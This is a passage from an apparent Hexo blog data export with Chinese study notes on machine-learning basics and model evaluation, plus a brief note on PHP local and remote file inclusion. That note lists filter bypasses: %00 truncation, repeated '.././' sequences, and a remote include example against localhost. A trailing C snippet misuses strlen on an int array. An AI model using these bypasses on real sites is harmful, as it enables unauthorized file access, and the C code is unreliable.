title=\"1.符号主义学习\"></a>1.符号主义学习</h2><pre><code>    决策树、逻辑\n</code></pre>\n<h2 id=\"2-连接主义\"><a href=\"#2-连接主义\" class=\"headerlink\" title=\"2.连接主义\"></a>2.连接主义</h2><pre><code>    神经网络\n</code></pre>\n<h2 id=\"3-统计学习\"><a href=\"#3-统计学习\" class=\"headerlink\" title=\"3.统计学习\"></a>3.统计学习</h2><pre><code>    支持向量机、核方法\n</code></pre>\n"},{"title":"文件包含漏洞","date":"2021-07-22T03:21:00.000Z","mp3":null,"cover":"img/bg14.jpg","_content":"\n## 一、Defs\n\n​\t可执行的函数被保存在一个单个文件中，使用时直接调用函数。无需再次编写；\n\n​\t由于传入的文件没有经过检验**，动态包含文件**，导入了意料之外的文件导致文件泄露和恶意代码注入；\n\n### 1.常用导入函数\n\n​\tinclude,require,fopen,readfile等；\n\n#### （1）include， require的区别\n\n​\tinclude包含文件报错会继续运行，但是require会中断脚本运行；\n\n#### （2）include_once（）,require_once\n\n​\t仅包含一次同一个文件，若包含两次就终止脚本；\n\n#### （3） fopen（），readfile（）\n\nreadfile读取到缓存区，返回一个整数； fopen返回一个指针；\n\n## 二、分类\n\n### 1.本地文件漏洞（LFI）\n\n可以包含本地服务器的文件（通过上传传输到服务器），获得权限\n\n（1）文件在同一文件夹下\n\n（2）不在同一目录需要使用相对或绝对目录；\n\n#### 2.方法：\n\n%00(PHP5.3.4一下才能使用)；\n\n重复.././防止字符串替换\n\n### 3.远程文件漏洞（RFI）\n\n类似于代码注入，将一段在外地的代码执行；\n\n前提：\n\n（1）allow_url_fopen()\tallow_url_include()\n\n（2）\n\n（3）\n\n\n\n1=http://127.0.0.1:82/test.txtz","source":"_posts/文件包含漏洞.md","raw":"---\ntitle: 文件包含漏洞\ndate: 2021-07-22 11:21:00\ncategories: \n    - 网络安全\ntags: \n    - Web\n    - Security\nmp3: \ncover: img/bg14.jpg\n---\n\n## 一、Defs\n\n​\t可执行的函数被保存在一个单个文件中，使用时直接调用函数。无需再次编写；\n\n​\t由于传入的文件没有经过检验**，动态包含文件**，导入了意料之外的文件导致文件泄露和恶意代码注入；\n\n### 1.常用导入函数\n\n​\tinclude,require,fopen,readfile等；\n\n#### （1）include， require的区别\n\n​\tinclude包含文件报错会继续运行，但是require会中断脚本运行；\n\n#### （2）include_once（）,require_once\n\n​\t仅包含一次同一个文件，若包含两次就终止脚本；\n\n#### （3） fopen（），readfile（）\n\nreadfile读取到缓存区，返回一个整数； fopen返回一个指针；\n\n## 二、分类\n\n### 1.本地文件漏洞（LFI）\n\n可以包含本地服务器的文件（通过上传传输到服务器），获得权限\n\n（1）文件在同一文件夹下\n\n（2）不在同一目录需要使用相对或绝对目录；\n\n#### 2.方法：\n\n%00(PHP5.3.4一下才能使用)；\n\n重复.././防止字符串替换\n\n### 3.远程文件漏洞（RFI）\n\n类似于代码注入，将一段在外地的代码执行；\n\n前提：\n\n（1）allow_url_fopen()\tallow_url_include()\n\n（2）\n\n（3）\n\n\n\n1=http://127.0.0.1:82/test.txtz","slug":"文件包含漏洞","published":1,"updated":"2021-08-07T16:10:12.000Z","_id":"clg29vyi1005rao9cgjmte622","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"一、Defs\"><a href=\"#一、Defs\" class=\"headerlink\" title=\"一、Defs\"></a>一、Defs</h2><p>​    可执行的函数被保存在一个单个文件中，使用时直接调用函数。无需再次编写；</p>\n<p>​    由于传入的文件没有经过检验<strong>，动态包含文件</strong>，导入了意料之外的文件导致文件泄露和恶意代码注入；</p>\n<h3 id=\"1-常用导入函数\"><a href=\"#1-常用导入函数\" class=\"headerlink\" title=\"1.常用导入函数\"></a>1.常用导入函数</h3><p>​    include,require,fopen,readfile等；</p>\n<h4 id=\"（1）include，-require的区别\"><a href=\"#（1）include，-require的区别\" class=\"headerlink\" title=\"（1）include， require的区别\"></a>（1）include， require的区别</h4><p>​    include包含文件报错会继续运行，但是require会中断脚本运行；</p>\n<h4 id=\"（2）include-once（）-require-once\"><a href=\"#（2）include-once（）-require-once\" class=\"headerlink\" title=\"（2）include_once（）,require_once\"></a>（2）include_once（）,require_once</h4><p>​    仅包含一次同一个文件，若包含两次就终止脚本；</p>\n<h4 id=\"（3）-fopen（），readfile（）\"><a href=\"#（3）-fopen（），readfile（）\" class=\"headerlink\" title=\"（3） fopen（），readfile（）\"></a>（3） fopen（），readfile（）</h4><p>readfile读取到缓存区，返回一个整数； fopen返回一个指针；</p>\n<h2 id=\"二、分类\"><a href=\"#二、分类\" class=\"headerlink\" title=\"二、分类\"></a>二、分类</h2><h3 id=\"1-本地文件漏洞（LFI）\"><a href=\"#1-本地文件漏洞（LFI）\" class=\"headerlink\" title=\"1.本地文件漏洞（LFI）\"></a>1.本地文件漏洞（LFI）</h3><p>可以包含本地服务器的文件（通过上传传输到服务器），获得权限</p>\n<p>（1）文件在同一文件夹下</p>\n<p>（2）不在同一目录需要使用相对或绝对目录；</p>\n<h4 id=\"2-方法：\"><a href=\"#2-方法：\" class=\"headerlink\" title=\"2.方法：\"></a>2.方法：</h4><p>%00(PHP5.3.4一下才能使用)；</p>\n<p>重复.././防止字符串替换</p>\n<h3 id=\"3-远程文件漏洞（RFI）\"><a href=\"#3-远程文件漏洞（RFI）\" class=\"headerlink\" title=\"3.远程文件漏洞（RFI）\"></a>3.远程文件漏洞（RFI）</h3><p>类似于代码注入，将一段在外地的代码执行；</p>\n<p>前提：</p>\n<p>（1）allow_url_fopen()    allow_url_include()</p>\n<p>（2）</p>\n<p>（3）</p>\n<p>1=<a href=\"http://127.0.0.1:82/test.txtz\">http://127.0.0.1:82/test.txtz</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、Defs\"><a href=\"#一、Defs\" class=\"headerlink\" title=\"一、Defs\"></a>一、Defs</h2><p>​    可执行的函数被保存在一个单个文件中，使用时直接调用函数。无需再次编写；</p>\n<p>​    由于传入的文件没有经过检验<strong>，动态包含文件</strong>，导入了意料之外的文件导致文件泄露和恶意代码注入；</p>\n<h3 id=\"1-常用导入函数\"><a href=\"#1-常用导入函数\" class=\"headerlink\" title=\"1.常用导入函数\"></a>1.常用导入函数</h3><p>​    include,require,fopen,readfile等；</p>\n<h4 id=\"（1）include，-require的区别\"><a href=\"#（1）include，-require的区别\" class=\"headerlink\" title=\"（1）include， require的区别\"></a>（1）include， require的区别</h4><p>​    include包含文件报错会继续运行，但是require会中断脚本运行；</p>\n<h4 id=\"（2）include-once（）-require-once\"><a href=\"#（2）include-once（）-require-once\" class=\"headerlink\" title=\"（2）include_once（）,require_once\"></a>（2）include_once（）,require_once</h4><p>​    仅包含一次同一个文件，若包含两次就终止脚本；</p>\n<h4 id=\"（3）-fopen（），readfile（）\"><a href=\"#（3）-fopen（），readfile（）\" class=\"headerlink\" title=\"（3） fopen（），readfile（）\"></a>（3） fopen（），readfile（）</h4><p>readfile读取到缓存区，返回一个整数； fopen返回一个指针；</p>\n<h2 id=\"二、分类\"><a href=\"#二、分类\" class=\"headerlink\" title=\"二、分类\"></a>二、分类</h2><h3 id=\"1-本地文件漏洞（LFI）\"><a href=\"#1-本地文件漏洞（LFI）\" class=\"headerlink\" title=\"1.本地文件漏洞（LFI）\"></a>1.本地文件漏洞（LFI）</h3><p>可以包含本地服务器的文件（通过上传传输到服务器），获得权限</p>\n<p>（1）文件在同一文件夹下</p>\n<p>（2）不在同一目录需要使用相对或绝对目录；</p>\n<h4 id=\"2-方法：\"><a href=\"#2-方法：\" class=\"headerlink\" title=\"2.方法：\"></a>2.方法：</h4><p>%00(PHP5.3.4一下才能使用)；</p>\n<p>重复.././防止字符串替换</p>\n<h3 id=\"3-远程文件漏洞（RFI）\"><a href=\"#3-远程文件漏洞（RFI）\" class=\"headerlink\" title=\"3.远程文件漏洞（RFI）\"></a>3.远程文件漏洞（RFI）</h3><p>类似于代码注入，将一段在外地的代码执行；</p>\n<p>前提：</p>\n<p>（1）allow_url_fopen()    allow_url_include()</p>\n<p>（2）</p>\n<p>（3）</p>\n<p>1=<a href=\"http://127.0.0.1:82/test.txtz\">http://127.0.0.1:82/test.txtz</a></p>\n"},{"title":"机器学习-CH2-模型评估与选择","date":"2020-11-07T14:15:45.000Z","mp3":null,"cover":"img/machinelearning.jpg","_content":"\n## 一、经验误差与过拟合\n\t\n\n 1. 错误率：E=a/m\n 2. 误差：样本真实输出与预测输出之间的差异\n \t\ta.训练误差 b.测试误差 c.泛化误差\n 3. 注：努力使经验误差最小化；\n 4. 过拟合： 将训练样本的特点当作所有样本的一般性质。\n 5. 欠拟合：队训练样本的一般性质尚未学好。\n\n \n\n## 二、评估方法\n\t\n\n 1. 评估方向：泛化性能、时间开销、存储开销、可解释性等。\n 2. 留出法：直接将数据集划分为两个互斥集合；两个集合尽可能保持数分布的一致性；随即划分、重复实验取均值；训练/测试=2：1 ~ 4：1\n 3. 交叉验证法：将数据划分为K个大小相似的互斥子集，每次使用k-1个子集作为训练集，余下的作为测试集，最终得到k个结果的均值，k常取：10；\n 4. 自助法：假设给定的数据集包含d个样本。该数据集有放回地抽样m次，产生m个样本的训练集。这样原数据样本中的某些样本很可能在该样本集中出现多次。没有进入该训练集的样本最终形成检验集（测试集）；\n 5. 注：数据较小使用自助法，数据量足够使用留出法和交叉验证法；\n\n## 三、性能度量\n\t\n\n 1. 性能度量是衡量模型泛化能力的评价标准；\n 2. 回归：均方误差\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106122704230.png#pic_center)\n 3. 分类：错误率、精度\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106122838653.png#pic_center)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106122856105.png#pic_center)\n 4. 查准率、查全率、F1\n例：\n判断得是否正确，在二分类任务中有四种表现形式，还拿西瓜🍉举例：\n好西瓜判断成好西瓜，判断正确①；\n好西瓜判断成坏西瓜，判断错误②；\n坏西瓜判断成好西瓜，判断错误③；\n坏西瓜判断成坏西瓜，判断正确④；\n其中，①和④都是判断正确，②和③都是判断错误。错误率和精度是①和④、②和③的综合判断，只有判断正确与否的概念，没有正例反例的区别。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106202201469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n查准率P：【真正例样本数】与【预测结果是正例的样本数】的比值。\n\n查全率T：【真正例样本数】与【真实情况是正例的样本数】的比值。\n注：P-R图（即以查全率做横轴，查准率做纵轴的平面示意图）\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020110620242432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；\n当曲线有交叉的时候：\n第一种方法是比较曲线下面积，但值不太容易估算；\n第二种方法是比较两条曲线的平衡点，平衡点是“查准率=查全率”时的取值，在图中表示为曲线和对角线的交点。平衡点在外侧的曲线的学习器性能优于内侧。\n\n 5. ROC与AUC\n 真正例率（TPR）：【真正例样本数】与【真实情况是正例的样本数】的比值。（查全率）\n假正例率（FPR）：【假正例样本数】与【真实情况是反例的样本数】的比值。\nROC图全名“受试者工作特征”，以真正例率为纵轴，以假正例率为横轴。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106202702423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n性能度量的方法：绘制ROC曲线\n当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；\n当曲线有交叉的时候：比较ROC面积，即AUC。\n 6. 代价敏感错误率与代价曲线\n 性能度量的方法：绘制代价曲线\n 代价曲线的横轴是正例概率代价P(+)cost，纵轴是归一化代价 cost_{norm} 。\n \n## 四、比较检验（见《概率论》）\n\n 1. 二项检验\n 2. t检验\n 3. 交叉验证t检验\n 4. 5*2交叉检验\n\n\n## 五、偏差与方差\n偏差：期望输出与真实标记的差别。\n偏差度量学习算法期望预测与真实结果的偏离程度，刻画拟合能力；\n方差度量同样大小训练集的变动所导致的学习性能的变化，刻画数据扰动的影响；\n噪声表达学习算法的期望泛化误差的下线，刻画了学习问题本身的难度；\n偏差-方差窘境：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020110722102568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n\n\n\n","source":"_posts/机器学习-CH2-模型评估与选择.md","raw":"---\ntitle: 机器学习-CH2-模型评估与选择\ndate: 2020-11-07 22:15:45\ncategories: \n    - 计算机科学\ntags: \n    - 机器学习\nmp3: \ncover: img/machinelearning.jpg\n---\n\n## 一、经验误差与过拟合\n\t\n\n 1. 错误率：E=a/m\n 2. 误差：样本真实输出与预测输出之间的差异\n \t\ta.训练误差 b.测试误差 c.泛化误差\n 3. 注：努力使经验误差最小化；\n 4. 过拟合： 将训练样本的特点当作所有样本的一般性质。\n 5. 欠拟合：队训练样本的一般性质尚未学好。\n\n \n\n## 二、评估方法\n\t\n\n 1. 评估方向：泛化性能、时间开销、存储开销、可解释性等。\n 2. 留出法：直接将数据集划分为两个互斥集合；两个集合尽可能保持数分布的一致性；随即划分、重复实验取均值；训练/测试=2：1 ~ 4：1\n 3. 交叉验证法：将数据划分为K个大小相似的互斥子集，每次使用k-1个子集作为训练集，余下的作为测试集，最终得到k个结果的均值，k常取：10；\n 4. 自助法：假设给定的数据集包含d个样本。该数据集有放回地抽样m次，产生m个样本的训练集。这样原数据样本中的某些样本很可能在该样本集中出现多次。没有进入该训练集的样本最终形成检验集（测试集）；\n 5. 注：数据较小使用自助法，数据量足够使用留出法和交叉验证法；\n\n## 三、性能度量\n\t\n\n 1. 性能度量是衡量模型泛化能力的评价标准；\n 2. 回归：均方误差\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106122704230.png#pic_center)\n 3. 分类：错误率、精度\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106122838653.png#pic_center)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106122856105.png#pic_center)\n 4. 查准率、查全率、F1\n例：\n判断得是否正确，在二分类任务中有四种表现形式，还拿西瓜🍉举例：\n好西瓜判断成好西瓜，判断正确①；\n好西瓜判断成坏西瓜，判断错误②；\n坏西瓜判断成好西瓜，判断错误③；\n坏西瓜判断成坏西瓜，判断正确④；\n其中，①和④都是判断正确，②和③都是判断错误。错误率和精度是①和④、②和③的综合判断，只有判断正确与否的概念，没有正例反例的区别。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106202201469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n查准率P：【真正例样本数】与【预测结果是正例的样本数】的比值。\n\n查全率T：【真正例样本数】与【真实情况是正例的样本数】的比值。\n注：P-R图（即以查全率做横轴，查准率做纵轴的平面示意图）\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020110620242432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；\n当曲线有交叉的时候：\n第一种方法是比较曲线下面积，但值不太容易估算；\n第二种方法是比较两条曲线的平衡点，平衡点是“查准率=查全率”时的取值，在图中表示为曲线和对角线的交点。平衡点在外侧的曲线的学习器性能优于内侧。\n\n 5. ROC与AUC\n 真正例率（TPR）：【真正例样本数】与【真实情况是正例的样本数】的比值。（查全率）\n假正例率（FPR）：【假正例样本数】与【真实情况是反例的样本数】的比值。\nROC图全名“受试者工作特征”，以真正例率为纵轴，以假正例率为横轴。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201106202702423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n性能度量的方法：绘制ROC曲线\n当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；\n当曲线有交叉的时候：比较ROC面积，即AUC。\n 6. 代价敏感错误率与代价曲线\n 性能度量的方法：绘制代价曲线\n 代价曲线的横轴是正例概率代价P(+)cost，纵轴是归一化代价 cost_{norm} 。\n \n## 四、比较检验（见《概率论》）\n\n 1. 二项检验\n 2. t检验\n 3. 交叉验证t检验\n 4. 5*2交叉检验\n\n\n## 五、偏差与方差\n偏差：期望输出与真实标记的差别。\n偏差度量学习算法期望预测与真实结果的偏离程度，刻画拟合能力；\n方差度量同样大小训练集的变动所导致的学习性能的变化，刻画数据扰动的影响；\n噪声表达学习算法的期望泛化误差的下线，刻画了学习问题本身的难度；\n偏差-方差窘境：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020110722102568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n\n\n\n","slug":"机器学习-CH2-模型评估与选择","published":1,"updated":"2020-11-07T14:16:02.000Z","_id":"clg29vyi8006rao9c2qgp5dq3","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"一、经验误差与过拟合\"><a href=\"#一、经验误差与过拟合\" class=\"headerlink\" title=\"一、经验误差与过拟合\"></a>一、经验误差与过拟合</h2><ol>\n<li>错误率：E=a/m</li>\n<li>误差：样本真实输出与预测输出之间的差异<pre><code class=\"hljs\"> a.训练误差 b.测试误差 c.泛化误差\n</code></pre>\n</li>\n<li>注：努力使经验误差最小化；</li>\n<li>过拟合： 将训练样本的特点当作所有样本的一般性质。</li>\n<li>欠拟合：队训练样本的一般性质尚未学好。</li>\n</ol>\n<h2 id=\"二、评估方法\"><a href=\"#二、评估方法\" class=\"headerlink\" title=\"二、评估方法\"></a>二、评估方法</h2><ol>\n<li>评估方向：泛化性能、时间开销、存储开销、可解释性等。</li>\n<li>留出法：直接将数据集划分为两个互斥集合；两个集合尽可能保持数分布的一致性；随即划分、重复实验取均值；训练/测试=2：1 ~ 4：1</li>\n<li>交叉验证法：将数据划分为K个大小相似的互斥子集，每次使用k-1个子集作为训练集，余下的作为测试集，最终得到k个结果的均值，k常取：10；</li>\n<li>自助法：假设给定的数据集包含d个样本。该数据集有放回地抽样m次，产生m个样本的训练集。这样原数据样本中的某些样本很可能在该样本集中出现多次。没有进入该训练集的样本最终形成检验集（测试集）；</li>\n<li>注：数据较小使用自助法，数据量足够使用留出法和交叉验证法；</li>\n</ol>\n<h2 id=\"三、性能度量\"><a href=\"#三、性能度量\" class=\"headerlink\" title=\"三、性能度量\"></a>三、性能度量</h2><ol>\n<li>性能度量是衡量模型泛化能力的评价标准；</li>\n<li>回归：均方误差<br><img src=\"https://img-blog.csdnimg.cn/20201106122704230.png#pic_center\" alt=\"在这里插入图片描述\"></li>\n<li>分类：错误率、精度<br><img src=\"https://img-blog.csdnimg.cn/20201106122838653.png#pic_center\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20201106122856105.png#pic_center\" alt=\"在这里插入图片描述\"></li>\n<li>查准率、查全率、F1<br>例：<br>判断得是否正确，在二分类任务中有四种表现形式，还拿西瓜🍉举例：<br>好西瓜判断成好西瓜，判断正确①；<br>好西瓜判断成坏西瓜，判断错误②；<br>坏西瓜判断成好西瓜，判断错误③；<br>坏西瓜判断成坏西瓜，判断正确④；<br>其中，①和④都是判断正确，②和③都是判断错误。错误率和精度是①和④、②和③的综合判断，只有判断正确与否的概念，没有正例反例的区别。<br><img src=\"https://img-blog.csdnimg.cn/20201106202201469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br>查准率P：【真正例样本数】与【预测结果是正例的样本数】的比值。</li>\n</ol>\n<p>查全率T：【真正例样本数】与【真实情况是正例的样本数】的比值。<br>注：P-R图（即以查全率做横轴，查准率做纵轴的平面示意图）<br><img src=\"https://img-blog.csdnimg.cn/2020110620242432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br>当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；<br>当曲线有交叉的时候：<br>第一种方法是比较曲线下面积，但值不太容易估算；<br>第二种方法是比较两条曲线的平衡点，平衡点是“查准率=查全率”时的取值，在图中表示为曲线和对角线的交点。平衡点在外侧的曲线的学习器性能优于内侧。</p>\n<ol start=\"5\">\n<li>ROC与AUC<br>真正例率（TPR）：【真正例样本数】与【真实情况是正例的样本数】的比值。（查全率）<br>假正例率（FPR）：【假正例样本数】与【真实情况是反例的样本数】的比值。<br>ROC图全名“受试者工作特征”，以真正例率为纵轴，以假正例率为横轴。<br><img src=\"https://img-blog.csdnimg.cn/20201106202702423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br>性能度量的方法：绘制ROC曲线<br>当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；<br>当曲线有交叉的时候：比较ROC面积，即AUC。</li>\n<li>代价敏感错误率与代价曲线<br>性能度量的方法：绘制代价曲线<br>代价曲线的横轴是正例概率代价P(+)cost，纵轴是归一化代价 cost_{norm} 。</li>\n</ol>\n<h2 id=\"四、比较检验（见《概率论》）\"><a href=\"#四、比较检验（见《概率论》）\" class=\"headerlink\" title=\"四、比较检验（见《概率论》）\"></a>四、比较检验（见《概率论》）</h2><ol>\n<li>二项检验</li>\n<li>t检验</li>\n<li>交叉验证t检验</li>\n<li>5*2交叉检验</li>\n</ol>\n<h2 id=\"五、偏差与方差\"><a href=\"#五、偏差与方差\" class=\"headerlink\" title=\"五、偏差与方差\"></a>五、偏差与方差</h2><p>偏差：期望输出与真实标记的差别。<br>偏差度量学习算法期望预测与真实结果的偏离程度，刻画拟合能力；<br>方差度量同样大小训练集的变动所导致的学习性能的变化，刻画数据扰动的影响；<br>噪声表达学习算法的期望泛化误差的下线，刻画了学习问题本身的难度；<br>偏差-方差窘境：<br><img src=\"https://img-blog.csdnimg.cn/2020110722102568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、经验误差与过拟合\"><a href=\"#一、经验误差与过拟合\" class=\"headerlink\" title=\"一、经验误差与过拟合\"></a>一、经验误差与过拟合</h2><ol>\n<li>错误率：E=a/m</li>\n<li>误差：样本真实输出与预测输出之间的差异<pre><code> a.训练误差 b.测试误差 c.泛化误差\n</code></pre>\n</li>\n<li>注：努力使经验误差最小化；</li>\n<li>过拟合： 将训练样本的特点当作所有样本的一般性质。</li>\n<li>欠拟合：队训练样本的一般性质尚未学好。</li>\n</ol>\n<h2 id=\"二、评估方法\"><a href=\"#二、评估方法\" class=\"headerlink\" title=\"二、评估方法\"></a>二、评估方法</h2><ol>\n<li>评估方向：泛化性能、时间开销、存储开销、可解释性等。</li>\n<li>留出法：直接将数据集划分为两个互斥集合；两个集合尽可能保持数分布的一致性；随即划分、重复实验取均值；训练/测试=2：1 ~ 4：1</li>\n<li>交叉验证法：将数据划分为K个大小相似的互斥子集，每次使用k-1个子集作为训练集，余下的作为测试集，最终得到k个结果的均值，k常取：10；</li>\n<li>自助法：假设给定的数据集包含d个样本。该数据集有放回地抽样m次，产生m个样本的训练集。这样原数据样本中的某些样本很可能在该样本集中出现多次。没有进入该训练集的样本最终形成检验集（测试集）；</li>\n<li>注：数据较小使用自助法，数据量足够使用留出法和交叉验证法；</li>\n</ol>\n<h2 id=\"三、性能度量\"><a href=\"#三、性能度量\" class=\"headerlink\" title=\"三、性能度量\"></a>三、性能度量</h2><ol>\n<li>性能度量是衡量模型泛化能力的评价标准；</li>\n<li>回归：均方误差<br><img src=\"https://img-blog.csdnimg.cn/20201106122704230.png#pic_center\" alt=\"在这里插入图片描述\"></li>\n<li>分类：错误率、精度<br><img src=\"https://img-blog.csdnimg.cn/20201106122838653.png#pic_center\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20201106122856105.png#pic_center\" alt=\"在这里插入图片描述\"></li>\n<li>查准率、查全率、F1<br>例：<br>判断得是否正确，在二分类任务中有四种表现形式，还拿西瓜🍉举例：<br>好西瓜判断成好西瓜，判断正确①；<br>好西瓜判断成坏西瓜，判断错误②；<br>坏西瓜判断成好西瓜，判断错误③；<br>坏西瓜判断成坏西瓜，判断正确④；<br>其中，①和④都是判断正确，②和③都是判断错误。错误率和精度是①和④、②和③的综合判断，只有判断正确与否的概念，没有正例反例的区别。<br><img src=\"https://img-blog.csdnimg.cn/20201106202201469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br>查准率P：【真正例样本数】与【预测结果是正例的样本数】的比值。</li>\n</ol>\n<p>查全率T：【真正例样本数】与【真实情况是正例的样本数】的比值。<br>注：P-R图（即以查全率做横轴，查准率做纵轴的平面示意图）<br><img src=\"https://img-blog.csdnimg.cn/2020110620242432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br>当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；<br>当曲线有交叉的时候：<br>第一种方法是比较曲线下面积，但值不太容易估算；<br>第二种方法是比较两条曲线的平衡点，平衡点是“查准率=查全率”时的取值，在图中表示为曲线和对角线的交点。平衡点在外侧的曲线的学习器性能优于内侧。</p>\n<ol start=\"5\">\n<li>ROC与AUC<br>真正例率（TPR）：【真正例样本数】与【真实情况是正例的样本数】的比值。（查全率）<br>假正例率（FPR）：【假正例样本数】与【真实情况是反例的样本数】的比值。<br>ROC图全名“受试者工作特征”，以真正例率为纵轴，以假正例率为横轴。<br><img src=\"https://img-blog.csdnimg.cn/20201106202702423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br>性能度量的方法：绘制ROC曲线<br>当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；<br>当曲线有交叉的时候：比较ROC面积，即AUC。</li>\n<li>代价敏感错误率与代价曲线<br>性能度量的方法：绘制代价曲线<br>代价曲线的横轴是正例概率代价P(+)cost，纵轴是归一化代价 cost_{norm} 。</li>\n</ol>\n<h2 id=\"四、比较检验（见《概率论》）\"><a href=\"#四、比较检验（见《概率论》）\" class=\"headerlink\" title=\"四、比较检验（见《概率论》）\"></a>四、比较检验（见《概率论》）</h2><ol>\n<li>二项检验</li>\n<li>t检验</li>\n<li>交叉验证t检验</li>\n<li>5*2交叉检验</li>\n</ol>\n<h2 id=\"五、偏差与方差\"><a href=\"#五、偏差与方差\" class=\"headerlink\" title=\"五、偏差与方差\"></a>五、偏差与方差</h2><p>偏差：期望输出与真实标记的差别。<br>偏差度量学习算法期望预测与真实结果的偏离程度，刻画拟合能力；<br>方差度量同样大小训练集的变动所导致的学习性能的变化，刻画数据扰动的影响；<br>噪声表达学习算法的期望泛化误差的下线，刻画了学习问题本身的难度；<br>偏差-方差窘境：<br><img src=\"https://img-blog.csdnimg.cn/2020110722102568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n"},{"title":"特殊矩阵及广义表","date":"2021-08-08T12:56:45.000Z","mp3":null,"cover":"img/bg4.jpeg","_content":"\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    //存贮数据的数组\n    int Myarray[10]={10,5,7,3,12,20,17,4,23,14};\n\n    int arryLength=(strlen(Myarray)-2)/2;\n\n    printf(\"%d \",arryLength);\n    PrintSymmetricArray(Myarray,arryLength,arryLength);\n\n    return 0;\n}\n\nvoid PrintSymmetricArray(int 